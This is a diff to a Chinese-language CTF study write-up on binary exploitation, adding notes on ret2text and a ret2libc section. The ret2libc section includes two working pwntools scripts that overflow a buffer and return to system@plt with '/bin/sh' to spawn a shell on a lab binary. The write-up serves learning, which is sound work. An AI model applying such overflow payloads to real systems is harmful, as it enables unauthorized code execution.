@@ -92,13 +92,26 @@
 
 ![image-20230413221526012](./README.assets/image-20230413221526012.png)
 
-然后是secure()函数里面有一个可以直接利用的代码段
+然后是secure()函数里面有一个可以直接利用的代码段：
+
+* `MOV X Y`：代表把Y寄存器里卖弄的东西复制到X寄存器
+* `CALL F`：代表调用函数（或者叫过程）F，这个函数被记录在PLT表里面
 
 ![image-20230413222632206](./README.assets/image-20230413222632206.png)
 
 其地址为：0x0804863A
 
-因此我们现在的任务就是通过gets()将main()函数的返回地址指向0x0804863A。最简单粗暴的方式就是往里面输入超长的数据（从主函数的反编译代码里可以看出来其流程就是接受一个输入数据放进变量v4），导致数据溢出覆盖返回地址，让程序报错，通过报错信息来确定返回地址的位置。在IDA反编译代码中已经标注了了变量v4的位置是【ESP+1】【EBP-64】，但是我这个免费版的IDA只有64位，不知道分析32位二进制程序能不能行得通，所以后面尝试用更简单粗暴的方式确认一下：通过get()向变量v4填入超多垃圾数据，在GDB调试中观察报错信息：
+附：PLT表中的`_system`函数：
+
+![image-20230418190823122](./README.assets/image-20230418190823122.png)
+
+附：PLT表指向的GOT表中`_system`函数的真实内存地址：
+
+![image-20230418190935640](./README.assets/image-20230418190935640.png)
+
+![image-20230418191121369](./README.assets/image-20230418191121369.png)
+
+但是在这里不需要直接操作system()函数，因为想要的参数和指令已经存在于代码段了，因此现在的任务就是通过gets()将main()函数的返回地址指向0x0804863A。最简单粗暴的方式就是往里面输入超长的数据（从主函数的反编译代码里可以看出来其流程就是接受一个输入数据放进变量v4），导致数据溢出覆盖返回地址，让程序报错，通过报错信息来确定返回地址的位置。在IDA反编译代码中已经标注了了变量v4的位置是【ESP+1】【EBP-64】，但是我这个免费版的IDA只有64位，不知道分析32位二进制程序能不能行得通，所以后面尝试用更简单粗暴的方式确认一下：通过get()向变量v4填入超多垃圾数据，在GDB调试中观察报错信息：
 
 ![image-20230414134519936](./README.assets/image-20230414134519936.png)
 
@@ -441,12 +454,74 @@ pwn_obj.interactive()
 
 ## 04 ret2libc-1
 
+例行检查：堆栈不可执行、动态链接形式。
+
+![image-20230418183935153](./README.assets/image-20230418183935153.png)
+
+反编译结果：main()函数中存在可攻击缓冲区v4，secure()函数中存在system()函数，但是参数不是想要的。
+
+![image-20230418184203813](./README.assets/image-20230418184203813.png)
+
+![image-20230418184224970](./README.assets/image-20230418184224970.png)
+
+理论上只需要将内存中system()函数的参数"shell!?"的地址替换成程序中存在的一个"/bin/sh"的地址，再实现ret2text就可以了。先试着找找有没有现成的"/bin/sh"字符串：
+
+![image-20230418184719532](./README.assets/image-20230418184719532.png)
+
+然后定位一下system()函数的位置：
+
+![image-20230418185212834](./README.assets/image-20230418185212834.png)
+
+![image-20230418191605679](./README.assets/image-20230418191605679.png)
+
+让main()函数返回到PLT表中的system@plt函数位置即可，会自己跳转到真正的system函数代码段。需要注意的是，system()函数是通过`CALL`调用的，和上一个实验中直接`RET`到代码段不同：
+
+![stack-3](./README.assets/stack-3.jpg)
+
+像这样`CALL F`会产生一个新的栈帧，原来的EIP被保存到新栈帧的返回地址那里，因此正常情况下新栈帧返回地址指向的汇编指令应该是`CALL F`的下一条。在这个实验中，返回地址是伪造的，我期望的是在main()函数返回之后原地产生system()函数的栈帧，因此和上一个实验中的【从原main返回地址开始：指令地址、参数、下一条指令的地址、参数】不同，这里应该是【从原main返回地址开始：system@plt地址、system返回地址、参数】，区别就是因为`CALL`会有一个额外的压栈，我通过`RET`直接跳转到system()函数之后缺了这一步，所以应该在这里给他补上。
+
+不过我现在并不关心system会返回到哪里，所以就一块给填充上了：
+
+```python
+from pwn import *
 
 
-## 05 ret2libc-2
+# ret2libc1
+addr_system_plt = 0x08048460
+addr_bin_sh = 0x08048720
+
+pwn_obj = process("./ret2libc1")
+pwn_obj.sendline(
+    b"#" * 112 + 
+    p32(addr_system_plt) + 
+    b"#" * 4 + 
+    p32(addr_bin_sh))
+pwn_obj.interactive()
+```
+
+我还在网上找到一种更高效的地址搜索方法：
+
+```python
+from pwn import *
 
 
+# ret2libc1
+elf = ELF("./ret2libc1")
+addr_system_plt = elf.plt["system"]
+addr_bin_sh = next(elf.search(b"/bin/sh"))
+
+pwn_obj = process("./ret2libc1")
+pwn_obj.sendline(
+    b"#" * 112 + 
+    p32(addr_system_plt) + 
+    b"#" * 4 + 
+    p32(addr_bin_sh))
+pwn_obj.interactive()
+```
+
+两种方法都有效：
+
+![image-20230418201050266](./README.assets/image-20230418201050266.png)
 
 ## 06 ret2libc-3
-
 
